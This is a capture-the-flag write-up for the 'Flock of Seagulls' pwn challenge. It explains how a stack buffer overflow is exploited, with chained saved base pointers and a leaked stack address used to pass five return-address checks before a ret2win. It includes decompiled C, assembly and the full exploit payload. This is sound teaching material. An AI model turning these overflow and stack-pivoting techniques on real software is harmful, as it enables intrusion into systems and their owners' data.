# Flock of Seagulls

This is the second challenge of the ctf, whith a pretty straight design, or we have a main function that calls 5 functions one after another and then we have a buffer overflow which has to deal with the checks made by each return function, untill we get to the main, where we will be able to ret2win

Here is the last function called or the first one to check.
```c
void func5(void) {
  long unaff_retaddr;
  char buffer [112];
  ssize_t read_ret;
  int *stack_leak;
  
  stack_leak = buffer;
  printf("<<< Song Begins At %p\n",stack_leak);
  printf("PwnMe >>> ");
  // Overflow here
  read_ret = read(0,buffer,500);
  //
  if (unaff_retaddr != 0x401276) {
    fail();
  }
  return;
}
```
So firstly we can try to find the `offset` of the overflow.

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/ac8f9f49-e7ab-40d9-9f9e-654d6ad39008)

As we can see here it checks for the `136` offset, and here is the check in asm
```asm
   0x00000000004011f3 <+0>:	push   rbp
   0x00000000004011f4 <+1>:	mov    rbp,rsp
   ...
   0x0000000000401248 <+85>:	mov    QWORD PTR [rbp-0x10],rax
   0x000000000040124c <+89>:	mov    rax,QWORD PTR [rbp+0x8]
   0x0000000000401250 <+93>:	mov    QWORD PTR [rbp-0x18],rax
   ; # 0x401276 <func4+13>
   0x0000000000401254 <+97>:	lea    rax,[rip+0x1b]
   ; # cmp buffer-offset-136, <func4+13> 
   0x000000000040125b <+104>:	cmp    QWORD PTR [rbp-0x18],rax 
   0x000000000040125f <+108>:	je     0x401266 <func5+115>
   0x0000000000401261 <+110>:	call   0x4011d6 <fail>
   0x0000000000401266 <+115>:	nop
   0x0000000000401267 <+116>:	leave
   0x0000000000401268 <+117>:	ret
```
So we can't simply set the ret address as `win()`, instead we will need make works each checks and properly set the `base pointer` which at each functions' epilogue will change the `stack`.

In order to do it we will use the stack leak to properly build our input and make the `base pointer` always point to specific location of our input
```python3
payload = flat(
  b"A" * 0x80,
  stack_leak + N,   # We can chose an arbitrary place in the array to make works the next check
  p64(func4 + 13),  # + 13 because it doesn't check the start but the end     
)
```
That's the prototype to pass the first check and then continue. We will need to chose a properly position to make works the next check because the `base pointer` will become the new stack for the next function

Before the `leave`

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/5b46d32e-9b61-422a-a126-50d37e483e30)

And after it

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/c408ab91-e81a-4658-ac6e-a840cadb29cf)

In the case shown we changed the `basepointer` into a specific position of the buffer where at `[rbp - 8]` is located `func3 - 13`

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/c51f9e8e-2551-454c-b8db-6895316198a5)

Following this method, and with some trial and error, we are able to pass all the checks and get back to the main where we're able to ret2win.

Here is the payload i used in order to achieve it
```python3
payload = flat(
  # 0x20 bytes ofPad
  b"A" * 0x20,
  stack_leak + 0x40,
  p64(func3),
  # 0x10 bytes of Pad
  b"B" * 0x10,             
  stack_leak + 0x48,
  p64(func2),
  p64(func1),
  # 0x8 bytes of Pad
  b"C" * 0x8,             
  win,
  # 0x18 bytes of Pad
  b"D" * 0x18,             
  stack_leak + 0x20,
  p64(func4),
  # 0x8 bytes of Pad
  b"E" * 8,                
)
```
This is just a way to solve this but there lots of different solutions, all of them with the same idea.

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/fe52d0a4-a09c-4026-8261-24e158e6d435)

